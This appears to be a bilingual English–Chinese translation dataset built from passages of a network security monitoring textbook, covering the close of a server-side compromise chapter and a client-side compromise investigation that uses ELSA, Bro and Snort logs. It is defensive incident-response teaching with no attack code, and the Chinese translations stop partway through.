- en: We also learned that NSM data can’t answer every question by itself.
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还了解到，NSM 数据本身无法回答所有问题。
- en: Once the intruder leveraged stolen credentials (via the */etc/passwd* and */etc/*
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦入侵者利用被盗凭证（通过 */etc/passwd* 和 */etc/*
- en: '*shadow* files) to connect via OpenSSH, we couldn’t see the commands he ran,'
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: '*shadow* 文件）通过 OpenSSH 连接时，我们无法看到他运行的命令，'
- en: although we could see derivative actions like uploading an archive via FTP.
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然我们可以看到诸如通过 FTP 上传归档的派生行为。
- en: Using an NSM tool bundled with Sguil, we rebuilt the stolen archive,
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: 使用与 Sguil 捆绑的 NSM 工具，我们重建了被盗的归档文件，
- en: although we could have done the same sort of reassembly using Wireshark
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然我们本可以使用 Wireshark 做类似的重组
- en: or another tool.
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: 或者其他工具。
- en: This case introduced the idea of patterns of attack and how to analyze
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: 本案例介绍了攻击模式的概念以及如何分析
- en: them using NSM tools and methods. In the next chapter, we’ll turn the
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 NSM 工具和方法处理它们。在下一章中，我们将转到
- en: tables slightly and review a client-side compromise.
  id: totrans-450
  prefs: []
  type: TYPE_NORMAL
  zh: 稍微调整表格并回顾一下客户端妥协。
- en: Server-side Compromise **233**
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端妥协 **233**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**11**'
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: '**11**'
- en: '**c l i e N T- S i D e c o M P r o M i S e**'
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: '**C L I E N T - S I D E C O M P R O M I S E**'
- en: In the previous chapter’s examples,
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章的示例中，
- en: an intruder conducted reconnaissance
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者进行侦察
- en: against remote targets, identified services,
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 针对远程目标，识别的服务，
- en: and attacked them. After gaining access to
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: 并攻击它们。获取访问权限后
- en: one system with a vulnerable service, the intruder
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有一个易受攻击服务的系统，入侵者
- en: archived files of interest and exfiltrated them to a
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 将感兴趣的归档文件提取到一个
- en: remote server. All of this activity took place without
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 远程服务器。所有这些活动都在没有
- en: the explicit involvement of a user on the Vivian’s Pets
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: 用户在 Vivian's Pets 上的明确参与
- en: network.
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: 网络。
- en: This chapter demonstrates a client-side compromise—one of the other
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了客户端妥协——另一种常见的
- en: major categories of malicious network activity you are likely to encounter.
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会遇到的恶意网络活动的主要类别之一。
- en: Although this incident involves remote systems, the intruder does not initiate
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然此事件涉及远程系统，但入侵者并未主动发起
- en: the attack in the same manner as in a server-side compromise. We will use
  id: totrans-468
  prefs: []
  type: TYPE_NORMAL
  zh: 以与服务器端妥协相同的方式进行攻击。我们将使用
- en: similar NSM methodologies to detect and respond to the intrusion.
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: 使用类似的 NSM 方法来检测和响应入侵。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**client-side compromise defined**'
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: '**客户端妥协定义**'
- en: '*Client-side compromise* involves an intruder exploiting an application with'
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: '*客户端妥协* 是指入侵者利用带有'
- en: which a user interacts. This application could be a web browser, email client,
  id: totrans-473
  prefs: []
  type: TYPE_NORMAL
  zh: 用户交互的应用程序。这个应用程序可以是网页浏览器、电子邮件客户端、
- en: media player, or any other program that users rely on for access to network
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 媒体播放器或任何其他程序，用户依赖这些程序访问网络
- en: resources. An attacker might trick a user into visiting a compromised site
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: 资源。攻击者可能会诱使用户访问一个被入侵的网站
- en: and revealing her credentials, or he might simply position himself to take
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: 并揭示她的凭证，或者他可能会简单地定位自己以窃取
- en: advantage of a routine that the user follows.
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: 利用用户的日常操作。
- en: Client-side attacks have been popular since the mid-2000s, when attack-
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端攻击自 2000 年代中期以来一直很流行，当时攻击者
- en: ers realized that if they could convince a user application to execute (or be
  id: totrans-479
  prefs: []
  type: TYPE_NORMAL
  zh: 用户意识到，如果他们能说服一个用户应用程序执行（或被
- en: subject to) malicious code, their attacks would be more likely to succeed.
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 受到）恶意代码攻击的，他们的攻击更可能成功。
- en: Many organizations devote resources and expertise to countering server-side
  id: totrans-481
  prefs: []
  type: TYPE_NORMAL
  zh: 许多组织将资源和专业知识投入到应对服务器端
- en: attacks, but client-side attacks are much more difficult to stop or even detect.
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击，但客户端攻击更难以阻止甚至检测。
- en: Figure 11-1 shows a generic attack pattern for a client-side compromise.
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Victim executes malicious code on
  id: totrans-484
  prefs: []
  type: TYPE_NORMAL
- en: system, after being solicited by intruder
  id: totrans-485
  prefs: []
  type: TYPE_NORMAL
- en: or by innocent computer use.
  id: totrans-486
  prefs: []
  type: TYPE_NORMAL
- en: PHISHING EMAIL
  id: totrans-487
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-488
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-489
  prefs: []
  type: TYPE_NORMAL
- en: OR
  id: totrans-490
  prefs: []
  type: TYPE_NORMAL
- en: WEBSITE VISIT
  id: totrans-491
  prefs: []
  type: TYPE_NORMAL
- en: Website hosting
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
- en: malicious code
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
- en: OR
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  id: totrans-496
  prefs: []
  type: TYPE_NORMAL
- en: Malicious code
  id: totrans-497
  prefs: []
  type: TYPE_NORMAL
- en: on social media
  id: totrans-498
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-499
  prefs: []
  type: TYPE_NORMAL
- en: or other site
  id: totrans-500
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  id: totrans-501
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands,
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
- en: or run an unwanted malicious application.
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Malicious code causes victim to reach back to intruder
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-1: Client-side compromise at ack pat ern*'
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Figure 11-1, three of the most popular client-side attacks
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
- en: involve phishing email, visiting websites, and interacting with social media.
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
- en: How is this possible?
  id: totrans-512
  prefs: []
  type: TYPE_NORMAL
- en: '**236** Chapter 11'
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
- en: In all three attacks, an intruder creates an unsafe communication of some type.
    With a phishing email message, perhaps the intruder attaches a
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
- en: malicious executable, such as a document designed to exploit a vulnerable
  id: totrans-516
  prefs: []
  type: TYPE_NORMAL
- en: application like Microsoft Word or Adobe Reader. Phishing email messages
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
- en: or social media may also contain links to malicious websites operated by the
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
- en: intruder specifically to perform attacks. The target site could also be a com-
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
- en: pletely legitimate one, such as a news or sports page, where an attacker has
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
- en: inserted malicious code that compromises those who visit the site.
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
- en: The latest variants of these attacks are called *watering hole* or *strategic
    website compromise* attacks. An intruder compromises a website that she expects
  id: totrans-522
  prefs: []
  type: TYPE_NORMAL
- en: her targets to visit, such as a human rights or think tank site. When interested
  id: totrans-523
  prefs: []
  type: TYPE_NORMAL
- en: parties visit the site, malicious code attacks them without their knowledge.
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
- en: These attacks are fairly devastating because they are not tightly targeted
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
- en: (the intruder can’t be sure that her intended prey will visit the website),
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
- en: but they can be very stealthy because victims surfing the Web normally are
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
- en: unwittingly caught in this trap.
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attacks can result in the same levels of access as server-side
  id: totrans-529
  prefs: []
  type: TYPE_NORMAL
- en: attacks (discussed in Chapter 10). An attempt to exploit a vulnerable appli-
  id: totrans-530
  prefs: []
  type: TYPE_NORMAL
- en: cation, regardless of whether it succeeds, is a Cat 3 incident. If the attack
  id: totrans-531
  prefs: []
  type: TYPE_NORMAL
- en: succeeds and the intruder achieves user-level access, the scenario now quali-
  id: totrans-532
  prefs: []
  type: TYPE_NORMAL
- en: fies as a Cat 2 intrusion. If the intruder gains administrator- or root-level
  id: totrans-533
  prefs: []
  type: TYPE_NORMAL
- en: privileges, we must deal with a Cat 1 intrusion. Once the intruder estab-
  id: totrans-534
  prefs: []
  type: TYPE_NORMAL
- en: lishes a command-and-control channel, it’s Breach 3\. And if the intruder
  id: totrans-535
  prefs: []
  type: TYPE_NORMAL
- en: begins stealing data or taking other actions, we could be dealing with a
  id: totrans-536
  prefs: []
  type: TYPE_NORMAL
- en: Breach 2 or even a Breach 1 intrusion. (See Figure 9-5 o[n page 194](index_split_004.html#p228)
    for intrusion category definitions.) Whatever the category, the goal of the CIRT
  id: totrans-537
  prefs: []
  type: TYPE_NORMAL
- en: is, as always, to quickly determine the extent of the incident and to take
  id: totrans-538
  prefs: []
  type: TYPE_NORMAL
- en: rapid actions to contain the attack and mitigate risk of data loss, alteration,
  id: totrans-539
  prefs: []
  type: TYPE_NORMAL
- en: or degradation.
  id: totrans-540
  prefs: []
  type: TYPE_NORMAL
- en: '**client-side compromise in action**'
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
- en: For this chapter’s example, we’ll look at a client-side compromise that takes
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
- en: place on the Vivian’s Pets network but involves different computers. To
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
- en: make the situation slightly more complicated, the activity in question will
  id: totrans-544
  prefs: []
  type: TYPE_NORMAL
- en: be monitored by an NSM sensor watching two segments. This is a configu-
  id: totrans-545
  prefs: []
  type: TYPE_NORMAL
- en: ration supported by SO and it seems like a good choice when the hardware
  id: totrans-546
  prefs: []
  type: TYPE_NORMAL
- en: in question can support the additional load. We’ll see if that decision is jus-
  id: totrans-547
  prefs: []
  type: TYPE_NORMAL
- en: tified! The network appears as shown in Figure 11-2\.
  id: totrans-548
  prefs: []
  type: TYPE_NORMAL
- en: With this sensor configuration, the NSM platform will see traffic both
  id: totrans-549
  prefs: []
  type: TYPE_NORMAL
- en: to and from the wireless network and the internal network. (I’ve completely
  id: totrans-550
  prefs: []
  type: TYPE_NORMAL
- en: simulated the network here in order to include the NAT issues discussed
  id: totrans-551
  prefs: []
  type: TYPE_NORMAL
- en: earlier in the book, but they do not play a major role.)
  id: totrans-552
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **237**
  id: totrans-553
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-554
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 132](index-272_1.png)'
  id: totrans-555
  prefs: []
  type: TYPE_IMG
- en: Internet
  id: totrans-556
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-557
  prefs: []
  type: TYPE_NORMAL
- en: Wireless
  id: totrans-558
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-559
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-560
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
- en: Laptop
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
- en: Internal
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-2: Wireless and internal network segments on Vivian’s Pets network*'
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
- en: '***Getting the Incident Report from a User***'
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
- en: One afternoon the Vivian’s Pets CIRT receives a call from a concerned user.
  id: totrans-568
  prefs: []
  type: TYPE_NORMAL
- en: She reports logging in to Twitter and searching for messages to her user-
  id: totrans-569
  prefs: []
  type: TYPE_NORMAL
- en: name. She noticed a tweet from an unfamiliar username, *Callbackpnsm*, and
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
- en: the message was a little unsettling. The unknown tweet mentioned “updates
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
- en: to our health care plan” and provided a link to a site with *healthcarenews*
    in the URL. Curious, she copied and pasted the URL into her Firefox web
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
- en: browser to take a look. Figure 11-3 shows the suspicious tweet.
  id: totrans-573
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-3: Tweet from Cal backpnsm*'
  id: totrans-574
  prefs: []
  type: TYPE_NORMAL
- en: When an unknown or suspicious Twitter user sends a link to an un-
  id: totrans-575
  prefs: []
  type: TYPE_NORMAL
- en: recognized website, most security analysts become nervous. At this point,
  id: totrans-576
  prefs: []
  type: TYPE_NORMAL
- en: the Vivian’s Pets CIRT suspects that the unfortunate user has fallen for a
  id: totrans-577
  prefs: []
  type: TYPE_NORMAL
- en: '**238** Chapter 11'
  id: totrans-578
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-579
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 133](index-273_1.png)'
  id: totrans-580
  prefs: []
  type: TYPE_IMG
- en: client-side attack. The CIRT asks if the user recalls seeing anything suspi-
  id: totrans-581
  prefs: []
  type: TYPE_NORMAL
- en: cious after visiting the URL. The user replies that she saw something about
  id: totrans-582
  prefs: []
  type: TYPE_NORMAL
- en: a Java installation, and when she clicked through to learn about the health
  id: totrans-583
  prefs: []
  type: TYPE_NORMAL
- en: care update, all she saw was a blank page.
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
- en: The user became worried that something was wrong, so she decided
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
- en: to turn to the CIRT to get some help. The CIRT thanks the user for her
  id: totrans-586
  prefs: []
  type: TYPE_NORMAL
- en: report. It’s time to start investigating!
  id: totrans-587
  prefs: []
  type: TYPE_NORMAL
- en: '***Starting Analysis with ELSA***'
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
- en: One way to begin the analysis process is to query logs for the IP address in
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
- en: the tweet. We’ll start with ELSA.
  id: totrans-590
  prefs: []
  type: TYPE_NORMAL
- en: '**Querying for the IP address**'
  id: totrans-591
  prefs: []
  type: TYPE_NORMAL
- en: First, we’ll make sure that the ELSA query time frame begins before the user
  id: totrans-592
  prefs: []
  type: TYPE_NORMAL
- en: experienced the odd activity, and then we’ll add the IP address in question,
  id: totrans-593
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15, to the search bar. The results are shown in Figure 11-4\.
  id: totrans-594
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-4: Initial ELSA query results for 203.0.113.15*'
  id: totrans-595
  prefs: []
  type: TYPE_NORMAL
- en: ELSA tells us that it has 244 records, but, by default, it limits itself to
  id: totrans-596
  prefs: []
  type: TYPE_NORMAL
- en: 100 results. The oldest entry appears first. The results are not encourag-
  id: totrans-597
  prefs: []
  type: TYPE_NORMAL
- en: ing, with mentions of malicious Java applet and Vulnerable Java Version
  id: totrans-598
  prefs: []
  type: TYPE_NORMAL
- en: 1.7.x Detected. Seeing 0day JRE 17 metasploit Exploit Class is even worse.
  id: totrans-599
  prefs: []
  type: TYPE_NORMAL
- en: 'Thankfully, we do now have the victim’s IP address: 172.16.0.37\. Rather'
  id: totrans-600
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **239**
  id: totrans-601
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-602
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 134](index-274_1.png)'
  id: totrans-603
  prefs: []
  type: TYPE_IMG
- en: '![Image 135](index-274_2.png)'
  id: totrans-604
  prefs: []
  type: TYPE_IMG
- en: than scroll through multiple pages of output, we select the program element
  id: totrans-605
  prefs: []
  type: TYPE_NORMAL
- en: near the top of the screen to see a summary count of all data sources ELSA
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
- en: possesses for this IP address. Figure 11-5 shows the result.
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-5: ELSA displays data sources for logs for 203.0.113.15\.*'
  id: totrans-608
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, Snort alerts dominate the results, although there are
  id: totrans-609
  prefs: []
  type: TYPE_NORMAL
- en: two HTTP records and one Bro connection log record.
  id: totrans-610
  prefs: []
  type: TYPE_NORMAL
- en: '**Checking the Bro HttP Log**'
  id: totrans-611
  prefs: []
  type: TYPE_NORMAL
- en: Clicking the *bro_http* link provides the results shown in Figure 11-6\.
  id: totrans-612
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-6: ELSA displays Bro HTTP log records for 203.0.113.15\.*'
  id: totrans-613
  prefs: []
  type: TYPE_NORMAL
- en: These two events bear the same timestamp in ELSA, but the Bro time-
  id: totrans-614
  prefs: []
  type: TYPE_NORMAL
- en: stamp shows that the top request happened first. That seems a little odd,
  id: totrans-615
  prefs: []
  type: TYPE_NORMAL
- en: given that it’s a request for *healthcarenews/Exploit.jar.pack.gz*. The second
  id: totrans-616
  prefs: []
  type: TYPE_NORMAL
- en: record, with a later timestamp, is for the *healthcarenews* page itself.
  id: totrans-617
  prefs: []
  type: TYPE_NORMAL
- en: Seeing a download for content titled *Exploit.jar.pack.gz* doesn’t inspire
  id: totrans-618
  prefs: []
  type: TYPE_NORMAL
- en: confidence. We need to find out what else happened to this victim system.
  id: totrans-619
  prefs: []
  type: TYPE_NORMAL
- en: '**Checking Snort alerts**'
  id: totrans-620
  prefs: []
  type: TYPE_NORMAL
- en: Returning to the first open tab in ELSA, we notice the *sig_msg* link. Clicking
    this link creates a new tab with a summary count of each of the Snort alerts
  id: totrans-621
  prefs: []
  type: TYPE_NORMAL
- en: associated with 203.0.113.15, as shown in Figure 11-7\.
  id: totrans-622
  prefs: []
  type: TYPE_NORMAL
- en: The summary of observed Snort signatures includes references to the
  id: totrans-623
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Meterpreter, including the core_channel and stdapi, with Command
  id: totrans-624
  prefs: []
  type: TYPE_NORMAL
- en: Request and Command Response for each. This is not encouraging either.
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
- en: '**240** Chapter 11'
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 136](index-275_1.png)'
  id: totrans-628
  prefs: []
  type: TYPE_IMG
- en: Metasploit ( *http://www.metasploit.com/*) is an open source reconnaissance
  id: totrans-629
  prefs: []
  type: TYPE_NORMAL
- en: and exploitation framework created by HD Moore and now supported by
  id: totrans-630
  prefs: []
  type: TYPE_NORMAL
- en: Rapid7 and a team of developers. The Meterpreter is a Metasploit *payload*,
  id: totrans-631
  prefs: []
  type: TYPE_NORMAL
- en: code used by an attacker after initially gaining access to a target using an
  id: totrans-632
  prefs: []
  type: TYPE_NORMAL
- en: exploit delivered by another Metasploit module. Terms like core_channel and
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
- en: stdapi refer to functions and features in the Metasploit suite, and Command
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
- en: Request and Command Response indicate communication between the attacker’s
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
- en: system and the victim.
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-7: ELSA displays a summary of Snort signatures for 203.0.113.15\.*'
  id: totrans-637
  prefs: []
  type: TYPE_NORMAL
- en: The intruder appears to have gained the ability to execute code on the
  id: totrans-638
  prefs: []
  type: TYPE_NORMAL
- en: victim via a Java exploit.
  id: totrans-639
  prefs: []
  type: TYPE_NORMAL
- en: '**Searching for Other activity**'
  id: totrans-640
  prefs: []
  type: TYPE_NORMAL
- en: Next, we need to determine if this intruder interacted with any other systems.
  id: totrans-641
  prefs: []
  type: TYPE_NORMAL
- en: To accomplish that task, we return to the first tab with all the information
    for
  id: totrans-642
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15 and click the *srcip* link. ELSA tells us that only 203.0.113.15
    and 172.16.0.37 have records associated with 203.0.113.15, but for good measure,
  id: totrans-643
  prefs: []
  type: TYPE_NORMAL
- en: we also click the *dstip* link and get the same results. That means we probably
    have a handle on all activity involving 203.0.113.15—that IP address did not
  id: totrans-644
  prefs: []
  type: TYPE_NORMAL
- en: communicate with any other system we watch.
  id: totrans-645
  prefs: []
  type: TYPE_NORMAL
- en: Still, that result doesn’t mean that no other activity affected the victim,
  id: totrans-646
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37\. To investigate that lead, we run a new ELSA query for 172.16.0.37
  id: totrans-647
  prefs: []
  type: TYPE_NORMAL
- en: and then click the *program* link to get a summary count of records. We need
  id: totrans-648
  prefs: []
  type: TYPE_NORMAL
- en: to know what other connections 172.16.0.37 conducted. Figure 11-8 shows
  id: totrans-649
  prefs: []
  type: TYPE_NORMAL
- en: the results.
  id: totrans-650
  prefs: []
  type: TYPE_NORMAL
- en: We take a similar approach to investigating these logs. First, we check
  id: totrans-651
  prefs: []
  type: TYPE_NORMAL
- en: out the Snort alerts, summarize them, and look for new information. Nothing
  id: totrans-652
  prefs: []
  type: TYPE_NORMAL
- en: new appears here, except we see Snort alerts for package management,
  id: totrans-653
  prefs: []
  type: TYPE_NORMAL
- en: probably due to system updates.
  id: totrans-654
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **241**
  id: totrans-655
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-656
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 137](index-276_1.png)'
  id: totrans-657
  prefs: []
  type: TYPE_IMG
- en: '![Image 138](index-276_2.png)'
  id: totrans-658
  prefs: []
  type: TYPE_IMG
- en: '*Figure 11-8: ELSA displays data sources for logs for 172.16.0.37\.*'
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
- en: Next, we look at the dstip information and get results, as shown in
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11-9\. (I’ve snipped the results to concentrate on the most pertinent
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
- en: information.)
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-9: ELSA displays a summary of dstip entries for 172.16.0.37\.*'
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
- en: One entry catches our attention. The bottom record shows 10.0.0.99, an
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
- en: IP address in the Vivian’s Pets internal network. That means there were five
  id: totrans-665
  prefs: []
  type: TYPE_NORMAL
- en: connections between 172.16.0.37 and 10.0.0.99\. Are these legitimate? Could
  id: totrans-666
  prefs: []
  type: TYPE_NORMAL
- en: one or more be caused by an intruder abusing 172.16.0.37?
  id: totrans-667
  prefs: []
  type: TYPE_NORMAL
- en: Clicking the IP address 10.0.0.99 tells ELSA to query for records where
  id: totrans-668
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99 was the destination IP address and 172.16.0.37 was the source IP
  id: totrans-669
  prefs: []
  type: TYPE_NORMAL
- en: address. Figure 11-10 shows the results.
  id: totrans-670
  prefs: []
  type: TYPE_NORMAL
- en: These records show three SSH connections. All three appear in the
  id: totrans-671
  prefs: []
  type: TYPE_NORMAL
- en: Bro *conn.log* file, and two appear as “heuristic detections” in the Bro *notice.log*
    file. These connections could involve transfers of data via a program like
  id: totrans-672
  prefs: []
  type: TYPE_NORMAL
- en: Secure Copy (scp) or interactive logins using SSH. It’s probably worth look-
  id: totrans-673
  prefs: []
  type: TYPE_NORMAL
- en: ing for all activity involving 10.0.0.9, so we run a new query (not shown)
  id: totrans-674
  prefs: []
  type: TYPE_NORMAL
- en: '**242** Chapter 11'
  id: totrans-675
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-676
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 139](index-277_1.png)'
  id: totrans-677
  prefs: []
  type: TYPE_IMG
- en: for only that IP address, and group the results by program. They show
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
- en: 121 Snort alerts, 23 *conn.log* entries, 18 *dns.log* entries, 2 *notice.log*
    entries, and 1 *http.log* entry.
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
- en: Using the same investigative steps, we query each of the log types for any-
  id: totrans-680
  prefs: []
  type: TYPE_NORMAL
- en: thing interesting. All of the Snort alerts for 10.0.0.9 appear to be related
    to
  id: totrans-681
  prefs: []
  type: TYPE_NORMAL
- en: package management, as do the Bro log entries for the rest of the activity.
  id: totrans-682
  prefs: []
  type: TYPE_NORMAL
- en: Is that the end of the case? Was 172.16.0.37 the only victim, and the
  id: totrans-683
  prefs: []
  type: TYPE_NORMAL
- en: SSH connections to 10.0.0.9 normal business activity? Could our NSM plat-
  id: totrans-684
  prefs: []
  type: TYPE_NORMAL
- en: form have missed something?
  id: totrans-685
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-10: ELSA displays Bro log records for source IP 172.16.0.37 and
    destination IP 10.0.0.9\.*'
  id: totrans-686
  prefs: []
  type: TYPE_NORMAL
- en: '***Looking for Missing Traffic***'
  id: totrans-687
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we suspect that something may be wrong, and we want to
  id: totrans-688
  prefs: []
  type: TYPE_NORMAL
- en: make sure that the NSM platform is performing as expected. Is our system
  id: totrans-689
  prefs: []
  type: TYPE_NORMAL
- en: up to the task of watching two segments? Could it be dropping traffic?
  id: totrans-690
  prefs: []
  type: TYPE_NORMAL
- en: One way to answer these questions is to check Bro’s *capture_loss.log*, which
  id: totrans-691
  prefs: []
  type: TYPE_NORMAL
- en: reports on Bro’s packet-capture performance. Listing 11-1 shows the contents
  id: totrans-692
  prefs: []
  type: TYPE_NORMAL
- en: of the log at the time of this incident.
  id: totrans-693
  prefs: []
  type: TYPE_NORMAL
- en: $ **cat /nsm/bro/logs/current/capture_loss.log**
